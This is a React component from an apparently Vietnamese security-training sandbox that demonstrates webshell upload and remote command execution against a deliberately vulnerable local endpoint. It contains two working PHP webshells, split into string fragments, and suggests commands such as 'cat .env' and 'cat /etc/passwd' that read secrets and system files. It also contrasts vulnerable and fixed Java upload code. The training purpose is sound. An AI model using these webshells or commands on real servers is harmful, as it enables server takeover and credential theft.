'use client';
// features/security-sandbox/components/test-panels/upload-webshell-panel.tsx

import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { Icons } from '@/components/icons';
import { toast } from 'sonner';

const FILES = [
  { name: 'avatar.jpg', type: 'image/jpeg', content: 'dummy-image-bytes', safe: true },
  { name: 'shell.php', type: 'application/x-php', content: '<?p' + 'hp if(isset($_G' + 'ET["cmd"])) { sys' + 'tem($_GE' + 'T["cmd"]); } ?>', safe: false },
  { name: 'report.pdf', type: 'application/pdf', content: '%PDF-1.4 dummy-pdf', safe: true },
  { name: 'backdoor.php5', type: 'application/x-php', content: '<?p' + 'hp ec' + 'ho shell_e' + 'xec($_GE' + 'T["cmd"]); ?>', safe: false },
];

export function UploadWebshellPanel() {
  const [selected, setSelected] = useState(FILES[1]);
  const [customFile, setCustomFile] = useState<File | null>(null);
  const [uploadedFilename, setUploadedFilename] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [command, setCommand] = useState('id');
  const [cmdOutput, setCmdOutput] = useState('');

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      setCustomFile(e.target.files[0]);
      setUploadedFilename(null);
      setCmdOutput('');
    }
  };

  const upload = async () => {
    setLoading(true);
    try {
      const formData = new FormData();
      if (customFile) {
        formData.append('file', customFile);
      } else {
        // Tạo file ảo từ presets
        const file = new File([selected.content], selected.name, { type: selected.type });
        formData.append('file', file);
      }

      const res = await fetch('/api/v1/demo/upload/vulnerable', {
        method: 'POST',
        body: formData,
      });

      const data = await res.json();
      if (res.ok && data.success) {
        setUploadedFilename(data.filename);
        toast.success(data.message || 'Upload file thành công!');
      } else {
        toast.error(data.message || 'Gặp lỗi khi upload file');
      }
    } catch (e) {
      toast.error('Không thể kết nối tới server');
    } finally {
      setLoading(false);
    }
  };

  const runCmd = async () => {
    if (!uploadedFilename) return;
    try {
      const res = await fetch(`/api/v1/demo/upload/execute?filename=${uploadedFilename}&cmd=${encodeURIComponent(command)}`);
      const data = await res.json();
      if (res.ok && data.success) {
        setCmdOutput(data.output || 'Không có kết quả trả về');
      } else {
        setCmdOutput(data.message || 'Lỗi thực thi webshell');
      }
    } catch (e) {
      setCmdOutput('Không thể kết nối tới webshell');
    }
  };

  const reset = () => {
    setCustomFile(null);
    setUploadedFilename(null);
    setCmdOutput('');
    setCommand('id');
  };

  return (
    <div className="space-y-4">
      <Alert className="border-amber-500/30 bg-amber-500/5 dark:border-amber-500/40 dark:bg-amber-500/10">
        <AlertDescription className="text-amber-800 dark:text-amber-300 text-xs">
          <strong>Mô phỏng Upload Webshell (RCE):</strong> Ở chế độ Vulnerable, server chấp nhận lưu file script thực thi như <code>.php</code> mà không qua lọc đuôi file. Attacker tải lên tệp tin webshell rồi gửi request GET kèm tham số command để chạy lệnh hệ điều hành tùy ý trên Web Server.
        </AlertDescription>
      </Alert>

      {/* File Upload Selector */}
      <div className="space-y-2">
        <p className="text-xs font-semibold text-foreground">Chọn File mẫu hoặc tải file từ máy tính của bạn:</p>
        <div className="grid grid-cols-2 gap-2">
          {FILES.map((f) => (
            <button
              key={f.name}
              disabled={!!customFile}
              onClick={() => { setSelected(f); setUploadedFilename(null); setCmdOutput(''); }}
              className={`rounded border p-3 text-left text-xs transition-all ${
                !customFile && selected.name === f.name
                  ? f.safe
                    ? 'border-green-500/50 bg-green-950/20'
                    : 'border-red-500/50 bg-red-950/20'
                  : 'border-border/30 bg-muted/10 hover:bg-muted/20 disabled:opacity-40'
              }`}
            >
              <p className="font-mono font-semibold">{f.name}</p>
              <p className="text-muted-foreground">{f.type}</p>
              {!f.safe && <p className="text-red-400 mt-1">⚠️ Nguy hiểm (Webshell)</p>}
            </button>
          ))}
        </div>

        <div className="flex flex-col gap-1.5 p-3 rounded-lg border bg-muted/20">
          <label className="text-[11px] font-bold text-muted-foreground uppercase">Tự tải file của bạn:</label>
          <input
            type="file"
            onChange={handleFileChange}
            className="text-xs file:mr-2 file:py-1 file:px-2 file:rounded-md file:border-0 file:text-xs file:font-semibold file:bg-primary file:text-primary-foreground hover:file:bg-primary/90 cursor-pointer"
          />
        </div>
      </div>

      <div className="flex gap-2">
        <Button
          size="sm"
          onClick={upload}
          disabled={loading}
          variant={customFile || !selected.safe ? 'destructive' : 'outline'}
        >
          {loading ? 'Đang upload...' : `Upload ${customFile ? customFile.name : selected.name}`}
        </Button>
        {(uploadedFilename || customFile) && (
          <Button size="sm" onClick={reset} variant="outline">Reset</Button>
        )}
      </div>

      {!customFile && !selected.safe && !uploadedFilename && (
        <div className="rounded border border-orange-500/30 bg-orange-950/20 p-3 text-xs">
          <p className="text-xs text-muted-foreground font-semibold mb-1">Nội dung webshell PHP sẽ gửi:</p>
          <code className="text-orange-300 font-mono block whitespace-pre">{selected.content}</code>
        </div>
      )}

      {uploadedFilename && (
        <div className="space-y-3 rounded border border-red-500/40 bg-red-950/10 p-4">
          <p className="text-red-400 font-semibold text-xs flex items-center gap-1">
            <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
            Upload thành công! Webshell đã nằm trên Server tại đường dẫn:
          </p>
          <code className="text-xs text-red-300 block bg-background p-2 rounded border border-border/50 overflow-x-auto whitespace-nowrap">
            http://localhost:8080/uploads/sandbox/{uploadedFilename}
          </code>

          <div className="space-y-2 border-t border-border/50 pt-2">
            <p className="text-xs text-muted-foreground font-semibold">Tương tác trực tiếp với Webshell qua Command Terminal:</p>
            <div className="flex gap-2">
              <input
                value={command}
                onChange={(e) => setCommand(e.target.value)}
                className="flex-1 rounded border border-border/30 bg-background px-3 py-1 text-xs font-mono"
                placeholder="id, whoami, ls, cat .env, cat /etc/passwd"
              />
              <Button size="sm" onClick={runCmd} variant="destructive">Thực thi</Button>
            </div>
            <code className="text-[10px] text-muted-foreground block font-mono">
              GET /api/v1/demo/upload/execute?filename={uploadedFilename}&cmd={command}
            </code>
          </div>

          {cmdOutput && (
            <div className="rounded bg-black/80 p-3 border border-border/50 shadow-inner">
              <p className="text-[10px] text-muted-foreground font-mono mb-1 select-none">Webserver Terminal Output:</p>
              <pre className="text-xs text-green-400 font-mono whitespace-pre-wrap leading-relaxed">{cmdOutput}</pre>
            </div>
          )}
        </div>
      )}

      <div className="text-xs bg-muted/30 rounded p-3 font-mono space-y-1">
        <p className="text-red-400 font-semibold">Vulnerable Code (Chấp nhận lưu mọi file):</p>
        <code className="text-muted-foreground">{'Files.copy(file.getInputStream(), filePath);'}</code>
        <p className="text-green-400 font-semibold mt-2">Fixed Code (Giới hạn extension & Không cho phép thực thi):</p>
        <code className="text-muted-foreground">
          {'String ext = getExtension(filename);\nif (!ALLOWED_EXTS.contains(ext)) throw new BlockedException();'}
        </code>
      </div>
    </div>
  );
}
